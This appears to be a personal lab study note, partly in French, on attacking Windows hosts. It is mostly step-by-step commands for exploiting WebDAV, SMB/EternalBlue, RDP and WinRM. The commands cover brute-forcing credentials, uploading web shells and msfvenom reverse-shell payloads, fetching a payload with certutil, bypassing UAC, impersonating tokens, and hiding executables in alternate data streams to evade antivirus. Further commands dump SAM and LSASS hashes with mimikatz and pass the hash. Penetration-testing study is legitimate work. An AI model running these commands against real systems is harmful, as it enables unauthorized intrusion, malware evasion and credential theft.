#windowsPT
## Tools & commands

- davtest - kali tool #davtest
	- Scan, auth & exploit webDAV server
- cadaver - kali tool #cadaver
	- enable on webDAV server : file upload/download, editing, namespace op (copy,move), etc
- PsExec - windows telnet replacement, allow execution of processes with user creds #psexec
- EternalBlue - Metasploit module
	- Auxiliary module
	- Exploit module
- AutoBlue-MS17-010
	- Github : https://github.com/3ndG4me/AutoBlue-MS17-010
- xfreerdp
	- linux tool to do rdp
- crackmapexec
- evil-winRM
- Windows-Exploit-Suggester #Windows-Exploit-Suggester
	- Github : https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Windows-Kernel-Exploits #Windows-Kernel-Exploits
	- Github : https://github.com/SecWiki/windows-kernel-Exploits/tree/master/MS16-135
- Metasploit module
	- local_exploit_suggester #local_exploit_suggester
- UACMe - to bypass UAC #UACMe
	- Github : https://github.com/hfire0x/UACME
- Metasploit module #incognito
	- incognito - to impersonate user tokens
## Windows Vulnerabilities

### WebDAV

- Port 80/443
- set of extensions to the HTTP protocole
- runs on top of IIS (sites crée en PHP et ASP.NET) supported file : .asp, .aspx, .config, .php

WebDAV server implements auth by login/password

Attack step :
- Identifying if WebDAV is configured on the IIS server
- Bruteforce valid creds
- connect and uplaod mal code

demo 1
```bash

#reco
nmap -sv -p 80 --script=http-enum 10.2.17.124

#bruteforce creds
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlist/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/

#scan webDAV server
davtest -auth bob:password -url http://10.2.17.124/webdav

#The scan provide with extension file can be executed
#prepackage web shell on kali
ls -al /usr/share/webshells
ls -al /usr/share/webshells/asp

cadaver http://10.2.17.124/webdav
bob
password
put /usr/share/webshells/asp/webshell.asp

#maintenant en allant sur la page webshell.asp on a un executeur de commandes
```

demo 2 - msfvenom / metasploit listener
```bash

msfvenom -p widnows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp

cadaver http://10.2.17.124/webdav
bob
password
put shell.asp

msfconsole
use multi/handler
set paylaod windows/meterpreter/reverse_tcp
set LHOST 10.2.17.124
set LPORT 1234
run
#le listener est up
# se rendre sur le site webdav et ouvrir le fichier payload shell.asp
```

demo 3 full auto metasploit
```bash

msfconsole
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
set HttpPassword password
set HttpUsername bob
set RHOSTS 10.2.30.233
set PATH /webdav/metasploit.asp
exploit

```


### SMB

- port 445 (anciennement on top of netbios sur port 139)
- 2 lvl d'auth
	- User auth - username + password
	- Share auth - pasword

#psexec  
PsExec auth is performed via SMB
similar to RDP but without GUI, cmd only

in order to use psexec we need legit username/password or password hashes
Brute force is possible with know native account Administrator

Demo - manual
```bash

msfconsole
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploirt-framework/data/wordlists/common_users.txt
set USER_PASS /usr/share/metasploirt-framework/data/wordlists/unix_password
set RHOSTS 10.2.24.221
set verbose false
run

#if brute force works
#equivalent of psexec on linux is the python version : psexec.py
psexec.py Administrator@10.2.24.221
password
```
Demo - psexec msf module
```bash

msfconsole
search psexec
use exploit/windows/smb/psexec

set RHOSTS 10.2.24.221
set SMBUser Administrator
set SMBPAss password
exploit


```

### MS17-010 - EternalBlue

- NSA / 2017 / Exploit SMBv1 vuln / Used in wannacry
- Windows Vista/7/8/10/server 8-12-16
- Auxiliary and exploit module on msf

demo manual
```bash

nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.10.12

#clone autoblue, in the demo it s already installed
cd ~/EternalBlue/AutoBlue-MS17-010
cd shellcode
chmod +x shell_prep.sh
./shell_prep.sh
y
10.10.10.10
1234
1234
1
1

#in another terminal
nc -nvlp 1234

#back
cd ../
chmod +x eternalblue_exploit7.py
python eternalblue7.py 10.10.10.12 shellcode/sc_x64.bin

#in the listener
#session as auth/system
```
demo msf
```

msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12
exploit

#session as auth/system

```


### RDP

- port : 3389
- auth require username / clear text password
- possible to bruteforce

Demo
```bash

#nmap show nothing on 3389,but something run on 3333
#go verify with msf

msfconsole 
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner

set RHOSTS 10.2.24.86
set RPORT 3333
run

#tell if it s rdp and it s version

#bruteforce with hidra
hidra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333
#if creds found

xfreerdp /u:administrator /p:password /v:10.2.24.86:3333

```

### BlueKeep

### WinRM

- WinRM + Windows Remote Management tool
- works over HTTP(s)
- remote access, interaction, commands execution, manage/configure
- port : 5985/5986

- WinRM implement auth, username/password
- can bruteforce with crackmapexec
- also use evil-winrm tp obtain command shell

```bash

nmap -sV -p- 10.2.18.45 #winrm ports are not in 1000 mots use port so we have to use -p-
crackmapexec
crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passswords.txt
# if bruteforce works

crackmapexec winrm 10.2.18.45 -u administrator -p password -x "whoami"
#server/admin
crackmapexec winrm 10.2.18.45 -u administrator -p password -x "systeminfo"

#to connect to target with a shell
evil-winrm.rb -u administrator -p 'password' - i 10.2.18.45
#command shell


#winrm in msf
msfconsole
search winrm_script
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.2.18.45
set FORCE_VBS true
set USERNAME administrator
set PASSWORD password
exploit
#shell as auth/system

```
## Windows Privesc

Concept :
- noyau (kernel) = computer program / core of OS / has complete access to hardware
- Acts as translation layer between software and hardware
- Window Kernel = Windows NT

2 mode :
- kernel mode - program here have full rights
- User mode

Kernel exploit


### Metasploit privesc
```bash

# Context : open meterpreter session on victim

# current username
getuid
# current priv -> no system rights
getprivs
# In built meterpreter command to privesc
getsystem

# background the session
background

search suggester
use post/multi/recon/local_exploit_suggester

# set the backgrounded session
set SESSION 1

exploit

# provide lsit of potential exploit

# exemple with : ms16_014
# use suggested exploit
# run
# session as SYSTEM/AUTHORITY
```


#### Manual privesc
```bash

# Tool : Compare patch level with Microsoft db to find patch
# clone github

# just use - Windows-Exploit-Suggester via the github and follow the steps
# the principe est de juste faire un 'systeminfo' via la session meterpreter, save dans un txt et lancer le tool sur ce txt

```


### Bypass UAC with UACme

UAC = user account control
use to prevent unauthorized changes from being made to the OS

to bypass, need to be user in local admin group

UAC have several integrity lvl , low to high, below high -> can execute app without prompt

context : on a deja un user qui est dans le group admin local, il a des droits mais via une session meterpreter on ne peut pas vraiment exploiter ces droits car le UAC prompt bloque

```bash

#with meterpreter session with admin account

ps -S explorer.exe
migrate 2332
getsystem

net users
net localgroup administrators
get privesc 
# 4-5 lines, not a lot of admin rights

# need to transfer the .exe bin to the victim
# -> akagi64.exe

#build a payload to execute from the victim, this will be lauch with admin priv
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe

#listener
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.5.2
set LPORT 1234
run
# listener is on

# on the meterpreter session on victim
cd C:\\
mkdir Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
shell
dir # to show backdoor.exe and akagi64.exe
# if we wanted to execute backdoor with admin priv, we couldn't because UAC will block us
.\Akagi64.exe 23 C:\Temp\backdoor.exe

# we get a new meterpreter session on the previous listener
sysinfo
getuid
getprivs
# now we have 10+ lines of rights

ps
# list all processes with who execute them
# we can now migrate to a autority system priv
migrate 669 # for exemple
getuid # now we are authority system


```

### Access Token Impersonation

core element on windows, created and managed by lsass
generated by winlogon.exe when user authenticate and then token attached to userinit.exe (process to create another process) all child process inherit of the access token

2 lvl windows access token :
- impersonated level token : created as result of non interactive login, can be used only on local system
- delegated level token : created through interactive logon, can be use on any system

Impersonation attack needs this rights 
**need one the following !**
SeAssignPrimaryToken : allow user to impersonated tokens
SeCreateToken : allows user to create an arbitrary token with admin priv
SeImpersonatePrivilege : allows user to create process under security context of another user tipically with admin priv

 ```bash
 
#gain initial acces
nmap 10.2.24.20
#web server, with httpfileservice with rce vuln
set RHOSTS 10.2.24.20
use widnows/http/rejetto_hfs_exec
run

sysinfo
pgrep explorer
migrate 3512
getuid
#currently NT authority\local
getprivs
#9 lines, not so much admin rights, but we have one the priv for Impersonated access token attack

load incognito
#if meterpreter crash it s because the migration process
run
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
#ATTACKDEFENSE\Administrator
getprivs
#if fails
pgrep explorer
migrate 3512
getprivs
# 20 lines, admin rights

#if you are in a situation when you do list_tokens, you have 0 result, you have to do a potato attack
#ti will generate a access token which you will can impersonated
 ```




## Windows File System vulnerabilities

### Alternate Data Stream

ADS = NTFS file attribute to provide comp w/ MacOS HFS (Hierarchical File System)

Any file created in a NTFS formatted drive will have 2 streams :
- Data stream : default stream, contain the data file
- Resource stream : contains the metadata file

In attack, possible to hide mal code/exe to evade detection
can be done by storing in the file attribute resource stream(metadata) of a legitimate file
usually used to evade basic signature base AV / static scanning tool

windows vm demo
```powershell

notepad test.txt

```
metadata : (ressource stream)
![[Pasted image 20250421150910.png]]
hide mal code here

```powershell

notepad test.txt:secret.txt
#open a notepad for the content of secret.txt
#the file created is test.txt but the content is empty

#to hide for exemple winpeas exe
type winpeas.exe > test.txt:winpeas.exe
# we can now delete the original winpeas file

#to execute, need to creat a symbol link
mklink wupdate.exe C:\Temp\test.txt:winpeas.exe

wupdate #will execute the winpeas exe
```


## Windows Credential dumping

### Windows Password Hashes

Windows OS stores hashed password locally in the SAM(Security Accounts Manger) db
Auth and verification is done by LSA (Local Security Authority) (vulgarisation : LSA = API devant le programme LSASS(.exe))

up to Win serv 2003 : LM & NTLM hash
depuis Vista : only NTLM

- SAM is a db file for managing user accounts & password in windows, all passwords are hashed inside
- SAM db cannot be copied while the OS is running
- Windows NT Kernel keeps the SAM db file locked, attackers utilize in-memory techs/tool(mimikatz) to dump SAM hashes from LSASS process
- SAM is encrypted with a syskey

admin priv required to access/interact with LSASS process
![[Pasted image 20250421153520.png]]
with LM, max password length was 14, if more the rest is ignored

![[Pasted image 20250421153744.png]]

### Password in windows config files

possible to automate mass installation/configuration windows deployment (ex: for entreprise)
with the tool Unattended Windows Setup who use config file, sometimes password are in there
if left after use, attackers can used creds inside

typo of conf file :
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Autounattend.xml
passwords may be encoded in based64

Demo
```bash

#Context : GUI access on the windows victim

#on kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe

#Host server to get the payload from the victim
python -m SimpleHTTPSServer 80

#get it on the victim
#cmd
cd Desktop
#in built utility windows to download file
certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe

#back on kali
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.5.2
set LPORT 1234
run

#execute the payload on the windows

#in built meterpreter search utility
search -f Unattend.xml

#Or go search manually
cd C:\\
cd Windows/Panther
download Unattend.xml
cat Unattend.xml
#admin password is in here in b64

vim password.txt #and past the password here
base64 -d password.txt
#the password print on screen


#in a simple kali terminal
psexec.py Administrator@10.2.27.165


```


### Dumping hashes with Mimikatz

Mimikatz can be used to extract hashes from lsass.exe process memory where hashes are cached
- can use mimikatz exe or kiwi module with a meterpreter session with no upload needed
- to run correctly mimikatz will need admin privs

demo
```bash

msfconsole
search badblue
use exploit/widnows/http/badblue_passthru
set RHOSTS 10.2.18.199
exploit

#meterpreter session open
sysinfo
getuid #currently AUTH\admin
pgrep lsass
migrate 788
getuid #currently AUTH\system

load kiwi
? #to list kiwi commands
creds all
lsa_dump_sam #dump all user account and provide the SAM syskey
lsa_dump_secrets

#manual way
cd C:\\
mkdir Temp
cd Temp
#kali have the mimikatz.exe natively
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
.\mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
seukurlsa::logonpasswords

```

### Pass-The-Hash Attacks

if you have NTLM hashing or clear password, auth via SMB
tools :
- Metasploit PsExec module
- Crackmapexec
usefull for persistance if enter with exploit

psexec need LM hash in addition of NTLM hash
in a situation where we have both for an admin account

demo
 ```bash
 
 msfconsole
 search exploit/windows/meterpreter/reverse_tcp
 set SMBUser Administrator
 set SMBPass <LMhash:NTLMhash>
 set target Native\ upload
 exploit

#with cme
crackmapexec smb 10.2.28.132 -u Administrator -H "NTLMhash"
crackmapexec smb 10.2.28.132 -u Administrator -H "NTLMhash" -x "ipconfig"

 ```

```bash

smbmap -H target.ine.local -u Adminstrator -p "aad3b435b51404eeaad3b435b51404ee:dc72e068b40b8353b7c0c095bbeef7fa" -x "dir Users//Administrator//flag"

smbmap -H target.ine.local -u Adminstrator -p "aad3b435b51404eeaad3b435b51404ee:dc72e068b40b8353b7c0c095bbeef7fa" -x "dir Users//Administrator//flag/flag4.txt"

```